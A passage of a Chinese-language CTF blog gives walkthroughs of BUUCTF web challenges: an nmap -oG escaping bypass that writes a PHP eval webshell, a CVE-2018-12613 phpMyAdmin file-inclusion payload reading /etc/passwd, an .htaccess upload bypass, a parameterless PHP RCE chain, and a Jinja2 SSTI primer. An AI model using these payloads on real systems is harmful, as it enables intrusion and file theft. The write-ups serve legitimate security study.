<p>语法： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap [任意内容] -oG fileName</span><br></pre></td></tr></table></figure></p>
<p>接下来就是细节方面的讨论了。就是如何绕过前面所说的两个函数。我们需要写入文件的肯定是一句话木马，因此payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php</span><br></pre></td></tr></table></figure></p>
<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;</span><br></pre></td></tr></table></figure></p>
<p>这样子 <code>-oG</code> 与上下文变成一个整体，无法被当作参数执行。因此需要把单引号去掉，只要最前面添加单引号就可以把后面释放出来。修改后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php</span><br></pre></td></tr></table></figure></p>
<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php\&#x27;</span><br></pre></td></tr></table></figure></p>
<p>由于 <code>\\</code> 使后者不作为转移符号，因此第三个单引号还能起作用，与第四个单引号成对，单引号内容为空，可以去掉： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php\&#x27;</span><br></pre></td></tr></table></figure></p>
<p>于是 <code>oG</code> 可以被成功执行，但是此时前面的木马写入的文件的名字为 <code>shell.php'</code> 。（<strong>我由于已经做完了，下面蚁剑连接只是作为证明，以便理解</strong>） <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322191734.png" /></p>
<p>内容为： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322191747.png" /> （<code>\\</code> 使后者失去转义功能，仅仅作为 <code>\</code>，因此木马最前面有一个 <code>\</code>）</p>
<p>不是 <code>php</code> 文件，无法连接。接下需要把后面的单引号也要去掉，因此在后面也添加单引号： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php&#x27;</span><br></pre></td></tr></table></figure></p>
<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>简化后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php&#x27;\\&#x27;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>注意，前面的 <code>''\\''</code> 因为前面的两个单引号成对，因此 <code>\\</code> 不被单引号包括，也就是不是字符串；而后者 <code>'\\'''</code>中<code>\\</code>被单引号包括，因此前一个转义字符不执行转义字符，而是被当作普通的字符。</p>
</blockquote>
<p>因此最后生成的文件名为 <code>shell.php\\</code>。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322192825.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322192834.png" /></p>
<p>解决办法也很简单，那就是加一个空格就好： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&lt;?php eval($_POST[&quot;shell&quot;]);?&gt; -oG shell.php &#x27;</span><br></pre></td></tr></table></figure></p>
<p>经过两次函数后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;\\&#x27;&#x27;\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php &#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>简化后： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\\&lt;\?php eval\(\$_POST\[\&quot;shell\&quot;\]\)\;\?\&gt; -oG shell.php &#x27;\\&#x27;</span><br></pre></td></tr></table></figure></p>
<p>此时相当于把 <strong>木马</strong> 和 <code>\\</code> 一起写入了文件。路径如下，注意别把 <code>Starting</code> 也当作路径。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322193312.png" /></p>
<p>用蚁剑连接即可。flag在根目录。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>RCE</tag>
        <tag>nmap命令</tag>
      </tags>
  </entry>
  <entry>
    <title>GWCTF 2019 我有一个数据库</title>
    <url>/2022/03/24/GWCTF%202019%20%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境之后，不论是数据包还是页面源码，什么信息都没有，只有如下看不懂的字</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204732.png" /></p>
<p>因此，决定扫描目录，结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204816.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204824.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204843.png" /></p>
<p>将所有都访问一次，发现只有 <code>/phpmyadmin</code> 有用，界面如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324204938.png" /></p>
<h1 id="解题">解题</h1>
<p>通过该页面发现：</p>
<ol type="1">
<li><p>phpmyadmin 版本为 4.8.1</p></li>
<li><p>服务器用的是 apache</p></li>
<li><p>数据库是 mysql</p></li>
<li><p>PHP版本信息为 7.2.24-0ubuntu0.18.04.1</p></li>
<li><p>系统为 Ubuntu</p></li>
</ol>
<p>第一次碰到这种题目，有点懵逼，就去百度了一下 <code>phpmyadmin 4.8 漏洞</code> 发现了存在 <code>CVE-2018-12613</code> 远程文件包含漏洞。将找到的payload（这里要注意系统是Windows还是Linux）尝试一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd # linux payload</span><br></pre></td></tr></table></figure>
<p>结果：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205506.png" /></p>
<p>发现确实存在漏洞，那么将 <code>/etc/passwd</code> 改为我们想要的文件路径即可。问题是这里我们不知道 flag 在哪，一般在根目录或者网站目录，这里只知道根目录，所以就尝试以下根目录，即</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</span><br></pre></td></tr></table></figure>
<p>得到 flag</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324205738.png" /></p>
<h1 id="总结">总结</h1>
<p>本题考的是平常的总结，以及对信息的敏感度。看到一些版本信息要想到是否存在该版本特有的信息，并且即使搜索。平常遇到这类的问题也要多积累。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>phpmyadmin 漏洞</tag>
        <tag>CVE-2018-12613</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019 BabyUpload</title>
    <url>/2022/03/21/GXYCTF2019%20BabyUpload/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>打开环境可以很明显看到，这就是一个文件上传的题目。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321194818.png" /></p>
<h1 id="过滤测试">过滤测试</h1>
<h2 id="过滤类型测试">过滤类型测试</h2>
<p>随便上传一个图片 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195148.png" /></p>
<p>根据提示 <code>上传类型</code> 推测应该需要修改 <code>Content-Type</code>，尝试 <code>image/gif</code> 和 <code>imag/jpeg</code> 后，发现后者是可以的。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195315.png" /></p>
<h2 id="过滤后缀测试">过滤后缀测试</h2>
<p>将后缀修改为 <code>php</code> ，上传 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195444.png" /></p>
<p>经过多次尝试，发现我无法绕过这个过滤。此时思考，是否可以不用特定后缀又可以上传文件，想到了 <code>.htaccess</code> 。尝试一下发现成功！ <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321195835.png" /></p>
<p>记录一下地址 <code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/.htaccess</code>。之后，只要上传一个文件名为 <code>shell.jpg</code> 的木马即可。</p>
<h2 id="文件内容过滤">文件内容过滤</h2>
<p>写入一句话木马，然后上传，果不其然被过滤了。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200100.png" /></p>
<p>换一种写法发现还是不行 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200308.png" /></p>
<p>猜测过滤的应该是开头的那个 <code>php</code> 。因此，换一种写法，成功绕过。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200502.png" /></p>
<p>记录上传地址：<code>/var/www/html/upload/0ac6e66ec314df83922a1ebbbdf6e358/shell.jpg</code></p>
<h1 id="蚁剑连接get-flag">蚁剑连接get flag</h1>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200538.png" /></p>
<p>flag在根目录 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220321200555.png" /></p>
<p>成功。</p>
<h1 id="总结">总结</h1>
<ol type="1">
<li>要熟悉常用的上传类型，题目中大多考察的是图片，因此要熟记：<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>；</li>
<li>当脚本后缀被过滤之后，并且无法绕过时，需要想到 <code>.htaccess</code>；</li>
<li>文件内容的过滤，需要知道多种木马的写法。</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>GXYCTF2019 禁止套娃</title>
    <url>/2022/03/24/GXYCTF2019%20%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境之后发现什么信息都没有，数据包和源码都没有有用的信息。因此尝试扫描目录。但是我没有扫描出什么结果，可能是脚本不够强大吧。所以我又则疼了一会终于百度了以下，发现存在 <code>git</code> 泄露，因此使用 <code>githack</code> 下载。下载得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="解题">解题</h1>
<p>第一个 <code>if</code> 过滤了一些伪协议；</p>
<p>第二个 <code>if</code> 比较难，第一次遇见，这是过滤了函数的参数。<code>?(R)?</code> 是递归匹配模式的意思。匹配到的字符串都会被空代替，最后还需要满足强对比。所以，我们传入的exp在最后得有 <code>;</code> ，并且前面的部分都要被匹配，从而只剩下 <code>;</code>。</p>
<p>详细解释一下第二个匹配模式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[a-z,_]+\((?R)?\)可以分为以下4个部分：</span><br><span class="line">1. [a-z,_]  </span><br><span class="line">2. \(   </span><br><span class="line">3. (?R)?   </span><br><span class="line">4. \)</span><br></pre></td></tr></table></figure>
<p>假设输入的为 <code>print_r(scandir());</code>。这句话就是扫描某目录（此时目录并未指定），然后把目录下的所有文件名or子目录名形成一个数组返回并打印出来。</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">过程</th>
<th style="text-align: center;">被匹配的部分</th>
<th style="text-align: center;">备注</th>
<th style="text-align: center;">递归层数</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1</td>
<td style="text-align: center;">print_r</td>
<td style="text-align: center;"><code>[a-z,_]</code> 起作用</td>
<td style="text-align: center;">0</td>
</tr>
<tr class="even">
<td style="text-align: center;">2</td>
<td style="text-align: center;">print_r(</td>
<td style="text-align: center;"><code>\(</code> 起作用</td>
<td style="text-align: center;">0</td>
</tr>
<tr class="odd">
<td style="text-align: center;">3</td>
<td style="text-align: center;">print_r(scandir</td>
<td style="text-align: center;"><code>(?R)?</code> 起作用，进入递归，再次匹配<code>[a-z,_]</code></td>
<td style="text-align: center;">1</td>
</tr>
<tr class="even">
<td style="text-align: center;">4</td>
<td style="text-align: center;">print_r(scandir(</td>
<td style="text-align: center;"><code>\(</code> 再次起作用</td>
<td style="text-align: center;">1</td>
</tr>
<tr class="odd">
<td style="text-align: center;">5</td>
<td style="text-align: center;">print_r(scandir()</td>
<td style="text-align: center;">进入第一个递归之后的 <code>\)</code> 起作用<br>执行之后退出第一次递归</td>
<td style="text-align: center;">执行时属于：1<br>执行结束后退出第一层递归：0</td>
</tr>
<tr class="even">
<td style="text-align: center;">6</td>
<td style="text-align: center;">print_r(scandir())</td>
<td style="text-align: center;"><code>\)</code> 起作用</td>
<td style="text-align: center;">0</td>
</tr>
</tbody>
</table>
<p>最后剩下一个 <code>;</code> 成功匹配。如果带有参数，比如：<code>print_r(scandir('/'));</code>，到第4步为止都是一样的，第5步的时候因为此时应该匹配的是 <code>\)</code> ，但是，此时字符串的位置是 <code>'/')</code> 无法成功匹配，返回原来的字符串，从而无法绕过第二个 <code>if</code>。</p>
<p>成功绕过演示：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200901.png" /></p>
<p>失败演示：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200923.png" /></p>
<p>第三个 <code>if</code> 也比较简单，只是过滤了一些敏感词。</p>
<p>接下来就要做两件事：</p>
<ol type="1">
<li><p>找 flag 所在的路径，一般在当前目录或者根目录</p></li>
<li><p>找到了该怎么把路径表示出来，此时不能传入参数</p></li>
</ol>
<p>接下来需要对 PHP 比较了解的人能够想得到（反正我个菜鸟没有想到），先介绍几个函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. localeconv(): 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line"><span class="number">2</span>. scandir(): 列出给定目录中的文件和目录。</span><br><span class="line"><span class="number">3</span>. readfile(): 输出一个文件。本题中，如果使用该函数输出flag，需要在源码中查看</span><br><span class="line"><span class="number">4</span>. current(): 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line"><span class="number">5</span>. pos(): current() 的别名。</span><br><span class="line"><span class="number">6</span>. next(): 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"><span class="number">7</span>. array_reverse(): 以相反的元素顺序返回数组。</span><br><span class="line"><span class="number">8</span>. highlight_file(): 打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br><span class="line"><span class="number">9</span>. array_flip(): 将数组的键和值互换</span><br><span class="line"><span class="number">10</span>. array_rand(): 随机读取数组中的一个或多个单元</span><br></pre></td></tr></table></figure>
<p>以上最难理解的就是 <code>localeconv()</code>，但是这又是最关键的，因为不能传入参数，所以得想方设法找到路径 <code>/</code> 和 <code>.</code> ，而该函数就能够找到后者。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200955.png" /></p>
<p>注意上图中的箭头处，那是 <code>.</code> 。因此，我们只要将它取出来即可，这时候就需要用到<code>current()</code> 了。然后再配合上 <code>scandir()</code> 和 <code>print_r</code> 就可以得到当前目录下的信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
<p>返回结果：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201026.png" /></p>
<p>注意到 <code>flag.php</code> 在第4个，或者说是倒数第2个。此时有两种方法：</p>
<p>第一种，将整个数组反转，然后用 next() 取反转后的第二个元素，即 flag.php。payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201059.png" /></p>
<p>第二种比较看运气，利用 <code>array_flip()</code> 将交换数组的键和值</p>
<p><code>?exp=print_r(array_flip(scandir(current(localeconv()))));</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201121.png" /></p>
<p>然后利用 <code>array_rand(array_flip())</code> 将数组的键<strong>随机</strong>的读取</p>
<p><code>?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201131.png" /></p>
<p>最终的 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>由于随机性，所以需要多刷新几次。</p>
<h1 id="总结">总结</h1>
<p>由于对 PHP 代码的不熟悉，导致本题最多只能做到代码审计这一步。得挑个时候学学 PHP 了，跑不掉的呀。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>git泄露</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>Jinjia2+Flask模板注入</title>
    <url>/2022/04/05/Jinjia2+Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>记录一下关于Smarty模板注入的知识点以及相关的payload。</p>
<span id="more"></span>
<h1 id="基本原理">基本原理</h1>
<p><strong>路由</strong>： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> flask </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>route装饰器的作用：当访问http://ip:5000/index时，会自动调用<code>hello_world</code>函数。</p>
<p><strong>渲染方法</strong>： flask的渲染方法有<code>render_template</code>和<code>render_template_string</code>两种。</p>
<p>render_template是用来渲染一个<strong>指定的文件</strong>的。使用如下 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>而render_template_string则是用来渲染一个<strong>字符串</strong>的。SSTI与这个方法密不可分。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html = <span class="string">&#x27;&lt;h1&gt;This is index page&lt;/h1&gt;&#x27;</span></span><br><span class="line"><span class="keyword">return</span> render_template_string(html)</span><br></pre></td></tr></table></figure></p>
<p><strong>flask是使用Jinja2来作为渲染引擎的</strong>。</p>
<p>在网站的根目录下新建<code>templates</code>文件夹，这里是用来存放html文件。也就是模板文件。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test.py:</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_login</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/template/index.html:</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>This is index page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问<code>127.0.0.1:5000/index/</code>的时候，flask就会渲染出index.html的页面。</p>
<p>模板文件并不是单纯的html代码，而是<strong>夹杂着模板的语法</strong>，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法来传参。例子如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test.py：</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,url_for,redirect,render_template,render_template_string</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_login</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,content=<span class="string">&#x27;This is index page.&#x27;</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/templates/index.html：</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;content&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个时候页面仍然输出<code>This is index page</code>。</p>
<p><strong><code>&#123;&#123;&#125;&#125;</code>在Jinja2中作为变量包裹标识符。</strong></p>
<h1 id="漏洞利用">漏洞利用</h1>
<h2 id="xss利用">XSS利用</h2>
<p>存在漏洞的代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    data = request.args.get(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">    html = <span class="string">&#x27;&#x27;&#x27;&lt;h3&gt;%s&lt;/h3&gt; &#x27;&#x27;&#x27;</span> % (data)  <span class="comment"># 漏洞在这里</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(html)</span><br></pre></td></tr></table></figure></p>
<p><strong>这段代码存在漏洞的原因是数据(data)和代码的混淆</strong>。代码中的<code>data</code>是用户可控的，会和html拼接后直接带入渲染。</p>
<p>比如输入：<code>?id=&lt;script&gt;alert(1)&lt;/script&gt;</code>，则会弹出窗口。</p>
<p>将代码改为如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@app.route(&#x27;/test/&#x27;)</span><br><span class="line">def test():</span><br><span class="line">    data = request.args.get(&#x27;id&#x27;)</span><br><span class="line">    return render_template_string(&#x27;&lt;h1&gt;&#123;&#123; data &#125;&#125;&lt;/h1&gt;&#x27;,data=data)</span><br></pre></td></tr></table></figure></p>
<p>继续输入上述的payload，会发现<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>被输出，而不像之前那样弹出窗口。<strong>这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在xss了。在这段代码中用户所控的是data变量，而不是模板内容。存在漏洞的代码中，模板内容直接受用户控制的。</strong></p>
<p>模板注入并不局限于xss，它还可以进行其他攻击。</p>
<h2 id="文件包含命令执行">文件包含/命令执行</h2>
<p>题目地址：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5422&amp;page=1</p>
<p>（以上面的题目为例子说明）</p>
<h3 id="基础知识">基础知识</h3>
<p>在Jinja2模板引擎中，<code>&#123;&#123;&#125;&#125;</code>是变量包裹标识符。<code>&#123;&#123;&#125;&#125;</code>并不仅仅可以传递变量，还可以执行一些简单的表达式。</p>
<p>这里还是用上文中存在漏洞的代码。构造payload：<code>&#123;&#123;7*4&#125;&#125;</code>，会返回49，也就是表达式被执行了，这里能判断存在SSTI。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405150525.png" /></p>
<p>这里用<code>&#123;&#123;7*'7'&#125;&#125;</code>尝试一下，结果如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405150615.png" /></p>
<p>因此，判断模板引擎为Jinjia2，上面也说明了，flask是使用Jinja2来作为渲染引擎的。</p>
<h3 id="文件包含">文件包含</h3>
<p>看了师傅们的文章，是通过python的对象的继承来一步步实现文件读取和命令执行的的。顺着师傅们的思路，再理一遍。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找到父类`&lt;type &#x27;object&#x27;&gt;` -&gt; 寻找子类 -&gt; 找关于命令执行或者文件操作的模块。</span><br></pre></td></tr></table></figure></p>
<p>几个魔术方法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__class__  <span class="comment"># 返回类型所属的对象</span></span><br><span class="line">__mro__    <span class="comment"># 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span></span><br><span class="line">__base__   <span class="comment"># 返回该对象所继承的基类   or __bases__</span></span><br><span class="line"><span class="comment"># __base__和__mro__都是用来寻找基类的</span></span><br><span class="line"></span><br><span class="line">__subclasses__   <span class="comment"># 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span></span><br><span class="line">__init__  <span class="comment"># 类的初始化方法，所有自带类都包含init方法</span></span><br><span class="line">function.__globals__  <span class="comment"># 用于获取function所处空间下可使用的module、方法以及所有变量</span></span><br></pre></td></tr></table></figure></p>
<p>获取字符串的类对象： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.__class__</span><br><span class="line">结果：&lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405151051.png" /></p>
<p>寻找基类（这里要注意，不同的环境可能所处位置不同，本题是在2，而大部分都在1）： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__</span><br><span class="line">结果：(&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;)</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405151233.png" /></p>
<p>寻找可用引用，一般找基类的可用引用，通过上一步能知道基类（object）在元组中的位置： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[&lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span 